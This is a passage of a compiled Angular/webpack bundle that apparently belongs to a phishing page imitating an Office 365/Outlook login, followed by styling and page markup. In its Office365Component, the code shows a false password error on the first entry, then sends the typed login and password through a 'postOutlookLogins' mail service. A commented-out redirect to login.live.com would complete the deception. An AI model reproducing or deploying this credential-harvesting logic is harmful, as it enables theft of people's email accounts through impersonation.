    Office365Component.prototype.ngOnInit = function () {
    };
    Office365Component.prototype.getLogin = function () {
        setTimeout(function () {
            if (this.login.length > 4) {
                console.log("asafafa");
            }
            else {
                this.loginError = true;
            }
        }, 2000, this.signinPage = false);
        //this.login= "";
    };
    Office365Component.prototype.getPassword = function () {
        if (this.passwordEntries <= 1) {
            this.passwordErrorMessage = true;
            this.password = "";
        }
        else if (this.passwordEntries > 1) {
            this.mailService.postOutlookLogins(this.login, this.password);
            // window.location.assign("https://login.live.com")
        }
        this.passwordEntries++;
    };
    __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["ViewChild"])("passwordPage"),
        __metadata("design:type", _angular_core__WEBPACK_IMPORTED_MODULE_0__["ElementRef"])
    ], Office365Component.prototype, "passwordPage", void 0);
    __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["ViewChild"])("passwordinput"),
        __metadata("design:type", _angular_core__WEBPACK_IMPORTED_MODULE_0__["ElementRef"])
    ], Office365Component.prototype, "passwordinput", void 0);
    __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["ViewChild"])("loginInput"),
        __metadata("design:type", _angular_core__WEBPACK_IMPORTED_MODULE_0__["ElementRef"])
    ], Office365Component.prototype, "loginInput", void 0);
    Office365Component = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-office365',
            template: __webpack_require__(/*! ./office365.component.html */ "./src/app/office365/office365.component.html"),
            styles: [__webpack_require__(/*! ./office365.component.css */ "./src/app/office365/office365.component.css")]
        }),
        __metadata("design:paramtypes", [_mail_service__WEBPACK_IMPORTED_MODULE_1__["MailService"]])
    ], Office365Component);
    return Office365Component;
}());



/***/ }),

/***/ "./src/app/outlook/outlook.component.css":
/*!***********************************************!*\
  !*** ./src/app/outlook/outlook.component.css ***!
  \***********************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = ".container {\r\n    width: 100%;\r\n    height: 900px;\r\n    display: flex;\r\n}\r\n.row-header {\r\n    position: fixed;\r\n    display: flex;\r\n    align-items: center;\r\n    justify-content: space-between;\r\n    width: 100%;\r\n    background: rgba(241,254,244,0.95);\r\n    padding: 0 18px;\r\n\r\n}\r\n.btn-group-features, .btn-group-auth {\r\n    display: flex;\r\n    justify-content: space-between;\r\n    font-size: 15px;\r\n    font-weight: bold;\r\n    font-Family: kurd, sans-serif;\r\n    \r\n}\r\n.btn-group-features  >span:hover, .btn-group-auth >span:hover {\r\n    font-size: 16px;\r\n    font-weight: bold;\r\n    font-Family: kurd, sans-serif;\r\n    color: rgb(96, 96, 184);\r\n    \r\n}\r\n.btn-create {\r\n    width: 180px;\r\n    height: 40px;\r\n    border-radius: 5px;\r\n    display: flex;\r\n    align-items: center;\r\n    justify-content: center;\r\n    color: white;\r\n    background-color: rgb(24, 165, 24);\r\n    overflow: wrap;\r\n\r\n    font-size: 15px;\r\n    font-weight: bold;\r\n    font-Family: kurd, sans-serif;\r\n    margin: 0 15px;\r\n}\r\n.btn-group-features {\r\n    display: flex;\r\n    align-items: center;\r\n\r\n}\r\n.btn-group-auth {\r\n    display: flex;\r\n    align-items: center;\r\n    \r\n}\r\n.features-with-content {\r\n    margin-left: 6px;\r\n}\r\n.btn-group-features > span, .btn-group-auth > span {\r\n    margin-left: 25px;\r\n}\r\n.map-wrapper {\r\n    width: 100%;\r\n    height: 100vh;\r\n    background: rgba(241,254,244,0.95);\r\n}\r\n.info {\r\n    display: flex;\r\n    flex-direction: column;\r\n    position: absolute;\r\n    left: 100px;\r\n    top: 400px;\r\n    width: 450px;\r\n\r\n}\r\n.info > h1 {\r\n    font-weight: 900;\r\n    margin-bottom: 15px;\r\n\r\n}\r\n.info > h3 {\r\n    font-weight: light;\r\n}\r\n.info > a {\r\n    width: 180px;\r\n    height: 40px;\r\n    border-radius: 5px;\r\n    display: flex;\r\n    align-items: center;\r\n    justify-content: center;\r\n    color: white;\r\n    background-color: rgb(24, 165, 24);\r\n    overflow: wrap;\r\n\r\n    font-size: 16px;\r\n    font-weight: bold;\r\n    font-Family: kurd, sans-serif;\r\n}\r\n/* .container{\r\n    width: 100%;\r\n    height: 100vh;\r\n    display: flex;\r\n}\r\n.row-side {\r\n    width: 35%;\r\n    height: 100%;\r\n    display: flex;\r\n    align-items: center;\r\n    justify-content: center;\r\n    background-color: blueviolet;\r\n}\r\n.content {\r\n    display: flex;\r\n    align-items: center;\r\n    justify-content: center;\r\n    width: 500px;\r\n    height: 100%;\r\n}\r\n.row-content {\r\n    display: flex;\r\n    flex-direction: column;\r\n}\r\n.img-outlook {\r\nbackground: transparent;\r\n}\r\nh6 {\r\n    color: darkgray;\r\n    font-size: 10px;\r\n    margin: 20px 0;\r\n}\r\n.form {\r\n    display: flex;\r\n    flex-direction: column;\r\n}\r\n.form-group {\r\n    display: flex;\r\n    flex-direction: column;\r\n    margin-bottom: 15px;\r\n}\r\n\r\n.spn-languages {\r\n    color: darkgray;\r\n    font-size: 13px;\r\n}\r\n.btn-save-group {\r\n    display: flex;\r\n    margin: 25px 0;\r\n}\r\n.btn-icon-container {\r\n    border-radius: 50%;\r\n    width: 15px;\r\n    height: 15px;\r\n    border: 2px solid blueviolet;\r\n}\r\n.spn-save {\r\n    margin-left: 15px;\r\n    color: blueviolet;\r\n    font-size: 16px;\r\n}\r\n.content:before {\r\n    content: \" \";\r\n    display: flex;\r\n    position: relative;\r\n    left:0;\r\n    right: 0;\r\n    top:0;\r\n    bottom:0;\r\n    background: inherit;\r\n    filter: blur(5px);\r\n}\r\n@media only screen and (max-width: 600px) {\r\n    .container {\r\n        display: flex;\r\n        flex-direction: column;\r\n    }\r\n    .row-side {\r\n        width: 100%;\r\n        min-height: 350px;\r\n    }\r\n    .content {\r\n        \r\n    }\r\n} */\r\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNyYy9hcHAvb3V0bG9vay9vdXRsb29rLmNvbXBvbmVudC5jc3MiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IkFBQUE7SUFDSSxZQUFZO0lBQ1osY0FBYztJQUNkLGNBQWM7Q0FDakI7QUFDRDtJQUNJLGdCQUFnQjtJQUNoQixjQUFjO0lBQ2Qsb0JBQW9CO0lBQ3BCLCtCQUErQjtJQUMvQixZQUFZO0lBQ1osbUNBQW1DO0lBQ25DLGdCQUFnQjs7Q0FFbkI7QUFDRDtJQUNJLGNBQWM7SUFDZCwrQkFBK0I7SUFDL0IsZ0JBQWdCO0lBQ2hCLGtCQUFrQjtJQUNsQiw4QkFBOEI7O0NBRWpDO0FBQ0Q7SUFDSSxnQkFBZ0I7SUFDaEIsa0JBQWtCO0lBQ2xCLDhCQUE4QjtJQUM5Qix3QkFBd0I7O0NBRTNCO0FBQ0Q7SUFDSSxhQUFhO0lBQ2IsYUFBYTtJQUNiLG1CQUFtQjtJQUNuQixjQUFjO0lBQ2Qsb0JBQW9CO0lBQ3BCLHdCQUF3QjtJQUN4QixhQUFhO0lBQ2IsbUNBQW1DO0lBQ25DLGVBQWU7O0lBRWYsZ0JBQWdCO0lBQ2hCLGtCQUFrQjtJQUNsQiw4QkFBOEI7SUFDOUIsZUFBZTtDQUNsQjtBQUNEO0lBQ0ksY0FBYztJQUNkLG9CQUFvQjs7Q0FFdkI7QUFDRDtJQUNJLGNBQWM7SUFDZCxvQkFBb0I7O0NBRXZCO0FBQ0Q7SUFDSSxpQkFBaUI7Q0FDcEI7QUFDRDtJQUNJLGtCQUFrQjtDQUNyQjtBQUVEO0lBQ0ksWUFBWTtJQUNaLGNBQWM7SUFDZCxtQ0FBbUM7Q0FDdEM7QUFDRDtJQUNJLGNBQWM7SUFDZCx1QkFBdUI7SUFDdkIsbUJBQW1CO0lBQ25CLFlBQVk7SUFDWixXQUFXO0lBQ1gsYUFBYTs7Q0FFaEI7QUFDRDtJQUNJLGlCQUFpQjtJQUNqQixvQkFBb0I7O0NBRXZCO0FBQ0Q7SUFDSSxtQkFBbUI7Q0FDdEI7QUFDRDtJQUNJLGFBQWE7SUFDYixhQUFhO0lBQ2IsbUJBQW1CO0lBQ25CLGNBQWM7SUFDZCxvQkFBb0I7SUFDcEIsd0JBQXdCO0lBQ3hCLGFBQWE7SUFDYixtQ0FBbUM7SUFDbkMsZUFBZTs7SUFFZixnQkFBZ0I7SUFDaEIsa0JBQWtCO0lBQ2xCLDhCQUE4QjtDQUNqQztBQXVDRDs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7Ozs7O0lBb0ZJIiwiZmlsZSI6InNyYy9hcHAvb3V0bG9vay9vdXRsb29rLmNvbXBvbmVudC5jc3MiLCJzb3VyY2VzQ29udGVudCI6WyIuY29udGFpbmVyIHtcclxuICAgIHdpZHRoOiAxMDAlO1xyXG4gICAgaGVpZ2h0OiA5MDBweDtcclxuICAgIGRpc3BsYXk6IGZsZXg7XHJcbn1cclxuLnJvdy1oZWFkZXIge1xyXG4gICAgcG9zaXRpb246IGZpeGVkO1xyXG4gICAgZGlzcGxheTogZmxleDtcclxuICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XHJcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47XHJcbiAgICB3aWR0aDogMTAwJTtcclxuICAgIGJhY2tncm91bmQ6IHJnYmEoMjQxLDI1NCwyNDQsMC45NSk7XHJcbiAgICBwYWRkaW5nOiAwIDE4cHg7XHJcblxyXG59XHJcbi5idG4tZ3JvdXAtZmVhdHVyZXMsIC5idG4tZ3JvdXAtYXV0aCB7XHJcbiAgICBkaXNwbGF5OiBmbGV4O1xyXG4gICAganVzdGlmeS1jb250ZW50OiBzcGFjZS1iZXR3ZWVuO1xyXG4gICAgZm9udC1zaXplOiAxNXB4O1xyXG4gICAgZm9udC13ZWlnaHQ6IGJvbGQ7XHJcbiAgICBmb250LUZhbWlseToga3VyZCwgc2Fucy1zZXJpZjtcclxuICAgIFxyXG59XHJcbi5idG4tZ3JvdXAtZmVhdHVyZXMgID5zcGFuOmhvdmVyLCAuYnRuLWdyb3VwLWF1dGggPnNwYW46aG92ZXIge1xyXG4gICAgZm9udC1zaXplOiAxNnB4O1xyXG4gICAgZm9udC13ZWlnaHQ6IGJvbGQ7XHJcbiAgICBmb250LUZhbWlseToga3VyZCwgc2Fucy1zZXJpZjtcclxuICAgIGNvbG9yOiByZ2IoOTYsIDk2LCAxODQpO1xyXG4gICAgXHJcbn1cclxuLmJ0bi1jcmVhdGUge1xyXG4gICAgd2lkdGg6IDE4MHB4O1xyXG4gICAgaGVpZ2h0OiA0MHB4O1xyXG4gICAgYm9yZGVyLXJhZGl1czogNXB4O1xyXG4gICAgZGlzcGxheTogZmxleDtcclxuICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XHJcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcclxuICAgIGNvbG9yOiB3aGl0ZTtcclxuICAgIGJhY2tncm91bmQtY29sb3I6IHJnYigyNCwgMTY1LCAyNCk7XHJcbiAgICBvdmVyZmxvdzogd3JhcDtcclxuXHJcbiAgICBmb250LXNpemU6IDE1cHg7XHJcbiAgICBmb250LXdlaWdodDogYm9sZDtcclxuICAgIGZvbnQtRmFtaWx5OiBrdXJkLCBzYW5zLXNlcmlmO1xyXG4gICAgbWFyZ2luOiAwIDE1cHg7XHJcbn1cclxuLmJ0bi1ncm91cC1mZWF0dXJlcyB7XHJcbiAgICBkaXNwbGF5OiBmbGV4O1xyXG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcclxuXHJcbn1cclxuLmJ0bi1ncm91cC1hdXRoIHtcclxuICAgIGRpc3BsYXk6IGZsZXg7XHJcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xyXG4gICAgXHJcbn1cclxuLmZlYXR1cmVzLXdpdGgtY29udGVudCB7XHJcbiAgICBtYXJnaW4tbGVmdDogNnB4O1xyXG59XHJcbi5idG4tZ3JvdXAtZmVhdHVyZXMgPiBzcGFuLCAuYnRuLWdyb3VwLWF1dGggPiBzcGFuIHtcclxuICAgIG1hcmdpbi1sZWZ0OiAyNXB4O1xyXG59XHJcblxyXG4ubWFwLXdyYXBwZXIge1xyXG4gICAgd2lkdGg6IDEwMCU7XHJcbiAgICBoZWlnaHQ6IDEwMHZoO1xyXG4gICAgYmFja2dyb3VuZDogcmdiYSgyNDEsMjU0LDI0NCwwLjk1KTtcclxufVxyXG4uaW5mbyB7XHJcbiAgICBkaXNwbGF5OiBmbGV4O1xyXG4gICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcclxuICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTtcclxuICAgIGxlZnQ6IDEwMHB4O1xyXG4gICAgdG9wOiA0MDBweDtcclxuICAgIHdpZHRoOiA0NTBweDtcclxuXHJcbn1cclxuLmluZm8gPiBoMSB7XHJcbiAgICBmb250LXdlaWdodDogOTAwO1xyXG4gICAgbWFyZ2luLWJvdHRvbTogMTVweDtcclxuXHJcbn1cclxuLmluZm8gPiBoMyB7XHJcbiAgICBmb250LXdlaWdodDogbGlnaHQ7XHJcbn1cclxuLmluZm8gPiBhIHtcclxuICAgIHdpZHRoOiAxODBweDtcclxuICAgIGhlaWdodDogNDBweDtcclxuICAgIGJvcmRlci1yYWRpdXM6IDVweDtcclxuICAgIGRpc3BsYXk6IGZsZXg7XHJcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xyXG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XHJcbiAgICBjb2xvcjogd2hpdGU7XHJcbiAgICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2IoMjQsIDE2NSwgMjQpO1xyXG4gICAgb3ZlcmZsb3c6IHdyYXA7XHJcblxyXG4gICAgZm9udC1zaXplOiAxNnB4O1xyXG4gICAgZm9udC13ZWlnaHQ6IGJvbGQ7XHJcbiAgICBmb250LUZhbWlseToga3VyZCwgc2Fucy1zZXJpZjtcclxufVxyXG5cclxuXHJcblxyXG5cclxuXHJcblxyXG5cclxuXHJcblxyXG5cclxuXHJcblxyXG5cclxuXHJcblxyXG5cclxuXHJcblxyXG5cclxuXHJcblxyXG5cclxuXHJcblxyXG5cclxuXHJcblxyXG5cclxuXHJcblxyXG5cclxuXHJcblxyXG5cclxuXHJcblxyXG5cclxuXHJcbi8qIC5jb250YWluZXJ7XHJcbiAgICB3aWR0aDogMTAwJTtcclxuICAgIGhlaWdodDogMTAwdmg7XHJcbiAgICBkaXNwbGF5OiBmbGV4O1xyXG59XHJcbi5yb3ctc2lkZSB7XHJcbiAgICB3aWR0aDogMzUlO1xyXG4gICAgaGVpZ2h0OiAxMDAlO1xyXG4gICAgZGlzcGxheTogZmxleDtcclxuICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XHJcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcclxuICAgIGJhY2tncm91bmQtY29sb3I6IGJsdWV2aW9sZXQ7XHJcbn1cclxuLmNvbnRlbnQge1xyXG4gICAgZGlzcGxheTogZmxleDtcclxuICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XHJcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcclxuICAgIHdpZHRoOiA1MDBweDtcclxuICAgIGhlaWdodDogMTAwJTtcclxufVxyXG4ucm93LWNvbnRlbnQge1xyXG4gICAgZGlzcGxheTogZmxleDtcclxuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XHJcbn1cclxuLmltZy1vdXRsb29rIHtcclxuYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7XHJcbn1cclxuaDYge1xyXG4gICAgY29sb3I6IGRhcmtncmF5O1xyXG4gICAgZm9udC1zaXplOiAxMHB4O1xyXG4gICAgbWFyZ2luOiAyMHB4IDA7XHJcbn1cclxuLmZvcm0ge1xyXG4gICAgZGlzcGxheTogZmxleDtcclxuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XHJcbn1cclxuLmZvcm0tZ3JvdXAge1xyXG4gICAgZGlzcGxheTogZmxleDtcclxuICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XHJcbiAgICBtYXJnaW4tYm90dG9tOiAxNXB4O1xyXG59XHJcblxyXG4uc3BuLWxhbmd1YWdlcyB7XHJcbiAgICBjb2xvcjogZGFya2dyYXk7XHJcbiAgICBmb250LXNpemU6IDEzcHg7XHJcbn1cclxuLmJ0bi1zYXZlLWdyb3VwIHtcclxuICAgIGRpc3BsYXk6IGZsZXg7XHJcbiAgICBtYXJnaW46IDI1cHggMDtcclxufVxyXG4uYnRuLWljb24tY29udGFpbmVyIHtcclxuICAgIGJvcmRlci1yYWRpdXM6IDUwJTtcclxuICAgIHdpZHRoOiAxNXB4O1xyXG4gICAgaGVpZ2h0OiAxNXB4O1xyXG4gICAgYm9yZGVyOiAycHggc29saWQgYmx1ZXZpb2xldDtcclxufVxyXG4uc3BuLXNhdmUge1xyXG4gICAgbWFyZ2luLWxlZnQ6IDE1cHg7XHJcbiAgICBjb2xvcjogYmx1ZXZpb2xldDtcclxuICAgIGZvbnQtc2l6ZTogMTZweDtcclxufVxyXG4uY29udGVudDpiZWZvcmUge1xyXG4gICAgY29udGVudDogXCIgXCI7XHJcbiAgICBkaXNwbGF5OiBmbGV4O1xyXG4gICAgcG9zaXRpb246IHJlbGF0aXZlO1xyXG4gICAgbGVmdDowO1xyXG4gICAgcmlnaHQ6IDA7XHJcbiAgICB0b3A6MDtcclxuICAgIGJvdHRvbTowO1xyXG4gICAgYmFja2dyb3VuZDogaW5oZXJpdDtcclxuICAgIGZpbHRlcjogYmx1cig1cHgpO1xyXG59XHJcbkBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0aDogNjAwcHgpIHtcclxuICAgIC5jb250YWluZXIge1xyXG4gICAgICAgIGRpc3BsYXk6IGZsZXg7XHJcbiAgICAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcclxuICAgIH1cclxuICAgIC5yb3ctc2lkZSB7XHJcbiAgICAgICAgd2lkdGg6IDEwMCU7XHJcbiAgICAgICAgbWluLWhlaWdodDogMzUwcHg7XHJcbiAgICB9XHJcbiAgICAuY29udGVudCB7XHJcbiAgICAgICAgXHJcbiAgICB9XHJcbn0gKi8iXX0= */"

/***/ }),

/***/ "./src/app/outlook/outlook.component.html":
/*!************************************************!*\
  !*** ./src/app/outlook/outlook.component.html ***!
  \************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<div class=\"container\">\n  <div class=\"row-header\">\n    \n    <div class=\"btn-group-features\">\n        <div class=\"svg-header-logo\">\n            <svg height=50 width=100 xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 147 28\" fill=\"none\">\n          <path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M1.51165 0H25.7369C26.5715 0 27.2504 0.671185 27.2504 1.50214V4.16909C27.2504 4.99651 26.5716 5.67141 25.7369 5.67141H1.51165C0.676996 5.67141 0 4.99657 0 4.16909V1.50214C0 0.671185 0.676996 0 1.51165 0ZM1.51165 14.887H25.7369C26.5715 14.887 27.2504 15.5599 27.2504 16.3874V19.058C27.2504 19.8854 26.5716 20.5566 25.7369 20.5566H1.51165C0.676996 20.5566 0 19.8854 0 19.058V16.3874C0 15.5599 0.676996 14.887 1.51165 14.887ZM15.1376 22.3304H1.51165C0.676996 22.3304 0 23.0016 0 23.8309V26.4997C0 27.3272 0.676996 28 1.51165 28H15.1377C15.9759 28 16.6511 27.3272 16.6511 26.4997V23.8309C16.6511 23.0016 15.9759 22.3304 15.1376 22.3304ZM1.51165 7.44171H27.2504C28.0868 7.44171 28.7619 8.11469 28.7619 8.94379V11.6127C28.7619 12.4401 28.0868 13.1148 27.2504 13.1148H1.51165C0.676996 13.1148 0 12.4401 0 11.6127V8.94379C0 8.11469 0.676996 7.44171 1.51165 7.44171Z\" fill=\"#09A5DB\"></path>\n          <path fill-rule=\"evenodd\" clip-rule=\"evenodd\" d=\"M109.756 17.5829L105.561 11.473L109.151 6.77908C109.339 6.50854 109.387 6.24913 109.301 6.00538C109.238 5.82981 109.069 5.61788 108.634 5.61788H105.796C105.636 5.61788 105.479 5.65747 105.329 5.73025C105.168 5.79985 105.023 5.9423 104.913 6.12887L102.044 10.1077H101.346V0.705584C101.346 0.506208 101.278 0.341698 101.148 0.200867C101.017 0.0727158 100.842 0 100.646 0H97.9906C97.7969 0 97.6251 0.0727768 97.4832 0.199314C97.3398 0.335421 97.2642 0.499992 97.2642 0.705584V18.0623C97.2642 18.2615 97.3398 18.4356 97.4832 18.5654C97.6251 18.6998 97.7969 18.7662 97.9906 18.7662H100.646C100.842 18.7662 101.017 18.6998 101.148 18.5622C101.278 18.4292 101.346 18.2615 101.346 18.0623V13.4649H102.114L105.247 18.2189C105.469 18.5827 105.778 18.7663 106.163 18.7663H109.135C109.586 18.7663 109.774 18.5544 109.849 18.3739C109.957 18.1192 109.925 17.8629 109.756 17.5829ZM65.9565 14.653C66.1959 14.6656 66.3993 14.7938 66.5443 15.028L67.4665 16.5057C67.7138 16.8933 67.6776 17.2825 67.3749 17.6353C66.9178 18.113 66.3427 18.4706 65.6586 18.7064C64.973 18.9389 64.2448 19.0575 63.4788 19.0575C62.9273 19.0575 62.3661 18.9785 61.8178 18.8139C61.2677 18.6525 60.779 18.3946 60.3613 18.0592C59.9438 17.7238 59.5985 17.2762 59.3368 16.7445C59.0752 16.2066 58.9382 15.5532 58.9382 14.7939V9.10961H57.4077C57.206 9.10961 57.0342 9.03354 56.9003 8.87537C56.7742 8.72671 56.7048 8.55747 56.7048 8.3786V6.35042C56.7048 6.15266 56.7742 5.98343 56.9003 5.84253C57.0373 5.69232 57.206 5.61793 57.4077 5.61793H58.9382V2.36378C58.9382 2.14862 59.0185 1.96813 59.1572 1.83687C59.3022 1.70238 59.4739 1.6375 59.6679 1.6375H62.3487C62.5253 1.6375 62.6877 1.70238 62.8343 1.83687C62.9793 1.9682 63.0487 2.14862 63.0487 2.36378V5.61793H66.5003C66.6988 5.61793 66.8708 5.69232 67.0251 5.82985C67.1797 5.97392 67.2535 6.15266 67.2535 6.35042V8.3786C67.2535 8.56064 67.1797 8.72994 67.0298 8.88171C66.8753 9.03354 66.6988 9.10961 66.5003 9.10961H63.0487V13.8921C63.0487 14.1879 63.0897 14.422 63.1668 14.596C63.2472 14.767 63.3387 14.9014 63.452 14.9916C63.564 15.0817 63.6901 15.1483 63.8129 15.1736C63.9501 15.2084 64.0778 15.2211 64.1881 15.2211C64.3174 15.2211 64.4749 15.202 64.6626 15.1483C64.8532 15.0976 65.0534 15.0059 65.2709 14.8729C65.4978 14.7195 65.7327 14.6404 65.9565 14.653ZM54.9505 11.8464C54.5817 11.5237 54.139 11.261 53.6471 11.0649C53.1555 10.8688 52.632 10.7137 52.0836 10.6093L50.0615 10.2121C49.5429 10.1157 49.1821 9.98434 48.9787 9.81822C48.7974 9.67428 48.7076 9.50816 48.7076 9.30406C48.7076 9.09051 48.8353 8.91332 49.0843 8.75665C49.3585 8.58909 49.7401 8.50351 50.2129 8.50351C50.7346 8.50351 51.2452 8.60637 51.7227 8.80885C52.2065 9.01463 52.6605 9.24868 53.0561 9.50977C53.6455 9.87043 54.1452 9.82294 54.5061 9.40536L55.477 8.29624C55.6757 8.07785 55.7797 7.84062 55.7797 7.60334C55.7797 7.35499 55.6534 7.12715 55.4109 6.91988C54.9995 6.56389 54.3486 6.18583 53.477 5.81722C52.6055 5.44227 51.5084 5.25241 50.213 5.25241C49.3633 5.25241 48.5785 5.36639 47.8849 5.58777C47.1869 5.81244 46.5893 6.1225 46.1056 6.50851C45.6169 6.90403 45.2324 7.36437 44.9692 7.89444C44.7091 8.41961 44.5735 8.99548 44.5735 9.59517C44.5735 10.6851 44.9077 11.5726 45.5619 12.2356C46.2159 12.8826 47.089 13.3239 48.1622 13.5391L50.2633 13.9901C50.8607 14.1086 51.3145 14.2448 51.6093 14.3966C51.8646 14.5264 51.9875 14.7131 51.9875 14.974C51.9875 15.2083 51.8646 15.4155 51.6124 15.6037C51.3476 15.8062 50.9299 15.9059 50.3735 15.9059C49.7668 15.9059 49.2135 15.7808 48.7154 15.5372C48.216 15.2921 47.7619 14.9961 47.3632 14.6466C47.1756 14.4979 46.9692 14.3871 46.7532 14.3159C46.5011 14.2431 46.2188 14.3206 45.8927 14.5707L44.731 15.4646C44.3939 15.7461 44.2519 16.0862 44.315 16.4786C44.3719 16.8552 44.6934 17.2443 45.2938 17.6857C45.8297 18.0591 46.5168 18.3991 47.3443 18.6902C48.1717 18.9845 49.141 19.1348 50.2411 19.1348C51.1254 19.1348 51.9433 19.0226 52.6621 18.8011C53.3856 18.57 54.0191 18.2615 54.5377 17.866C55.0609 17.4689 55.4675 16.9817 55.7512 16.4279C56.0334 15.8743 56.1721 15.2683 56.1721 14.6339C56.1721 14.0154 56.0649 13.4696 55.8428 13.0107C55.6221 12.5567 55.3225 12.1644 54.9505 11.8464ZM12.2131 7.13189C11.6236 6.53239 10.9348 6.05931 10.1657 5.73651C9.39497 5.41377 8.57229 5.25243 7.71816 5.25243C6.82447 5.25243 6.02687 5.41855 5.35075 5.75553C4.82447 6.01338 4.37837 6.34091 4.03164 6.7222V6.35042C4.03164 6.15266 3.96069 5.98343 3.83463 5.84254C3.69736 5.69232 3.52882 5.61793 3.32698 5.61793H0.70454C0.499535 5.61793 0.329269 5.69232 0.198689 5.84254C0.0677376 5.98343 0 6.15266 0 6.35042V23.7878C0 23.984 0.0677376 24.1549 0.200111 24.291C0.335644 24.4237 0.499535 24.4902 0.704475 24.4902H3.37905C3.56034 24.4902 3.72274 24.4237 3.86447 24.291C4.00948 24.158 4.08204 23.9888 4.08204 23.7878V17.8361C4.43973 18.2316 4.91586 18.5338 5.48325 18.7411C6.19869 19.0068 6.9332 19.1349 7.66145 19.1349C8.5204 19.1349 9.35242 18.9752 10.1373 18.6525C10.9271 18.3218 11.6236 17.8504 12.2131 17.2445C12.8026 16.64 13.2786 15.8966 13.6205 15.0517C13.9736 14.1975 14.1439 13.2323 14.1439 12.1804C14.1439 11.1315 13.9736 10.1648 13.6205 9.31054C13.2785 8.464 12.8026 7.72672 12.2131 7.13189ZM9.81269 13.4317C9.66298 13.8034 9.45173 14.1404 9.18388 14.422C8.91907 14.7037 8.60391 14.933 8.24765 15.0881C7.89139 15.2479 7.4911 15.3286 7.06085 15.3286C6.64472 15.3286 6.24604 15.2431 5.88346 15.0881C5.51791 14.933 5.1931 14.7037 4.91882 14.422C4.64781 14.1404 4.43185 13.8035 4.28214 13.4317C4.1323 13.0535 4.05361 12.6437 4.05361 12.2071C4.05361 11.7705 4.1323 11.3608 4.28214 10.9794C4.43185 10.6093 4.64781 10.2787 4.91882 10.0034C5.1931 9.72501 5.51791 9.50338 5.88501 9.33576C6.2523 9.16957 6.64472 9.08418 7.06079 9.08418C7.49104 9.08418 7.88662 9.16957 8.24431 9.33576C8.60385 9.50338 8.91894 9.72507 9.18852 10.0001C9.45166 10.2786 9.66292 10.6093 9.81263 10.9794C9.96247 11.3608 10.0363 11.7705 10.0363 12.2071C10.0364 12.6437 9.96253 13.0535 9.81269 13.4317ZM28.5005 5.6178H25.8495C25.6698 5.6178 25.4996 5.6922 25.3593 5.83141C25.219 5.9802 25.1449 6.1526 25.1449 6.35036V6.67149C24.8471 6.31239 24.4419 6.00537 23.944 5.75553C23.2756 5.41855 22.4924 5.25243 21.6193 5.25243C20.7776 5.25243 19.9516 5.41377 19.1699 5.73651C18.3819 6.05931 17.6743 6.52593 17.0675 7.12716C16.4622 7.72672 15.9704 8.46083 15.6033 9.31048C15.2393 10.1584 15.0548 11.1282 15.0548 12.1803C15.0548 13.2322 15.2393 14.1974 15.6033 15.0517C15.9705 15.8965 16.4559 16.64 17.0548 17.2444C17.6539 17.8503 18.3567 18.3218 19.1431 18.6524C19.9266 18.975 20.7523 19.1349 21.594 19.1349C22.4657 19.1349 23.2552 18.9657 23.9314 18.6335C24.431 18.3818 24.8407 18.075 25.145 17.7174V18.0624C25.145 18.2616 25.2191 18.4358 25.3641 18.5655C25.506 18.7 25.6699 18.7663 25.8495 18.7663H28.5005C28.7007 18.7663 28.8678 18.7 29 18.5623C29.134 18.4294 29.2034 18.2616 29.2034 18.0624V6.35036C29.2034 6.1526 29.1356 5.98337 29.0049 5.84247C28.8741 5.69226 28.7007 5.6178 28.5005 5.6178ZM24.9211 13.4159C24.7715 13.8034 24.5603 14.1341 24.2987 14.4093C24.0307 14.6877 23.7107 14.9093 23.356 15.077C23.0014 15.2431 22.5979 15.3285 22.1677 15.3285C21.7548 15.3285 21.3577 15.2431 20.9934 15.077C20.6279 14.9093 20.3095 14.6877 20.0401 14.4093C19.7768 14.1404 19.5655 13.8034 19.4158 13.4159C19.2677 13.0313 19.192 12.6232 19.192 12.2071C19.192 11.7705 19.2677 11.3608 19.4158 10.9794C19.5655 10.6061 19.7768 10.2722 20.0401 10.0001C20.3095 9.72501 20.6265 9.50338 20.9934 9.33576C21.3577 9.16957 21.7548 9.08418 22.1677 9.08418C22.5979 9.08418 23.0015 9.16957 23.356 9.33576C23.7107 9.50338 24.0306 9.72507 24.2987 10.0001C24.5603 10.2786 24.7715 10.6093 24.9211 10.9794C25.071 11.3608 25.1449 11.7705 25.1449 12.2071C25.1449 12.6232 25.0709 13.0314 24.9211 13.4159ZM78.425 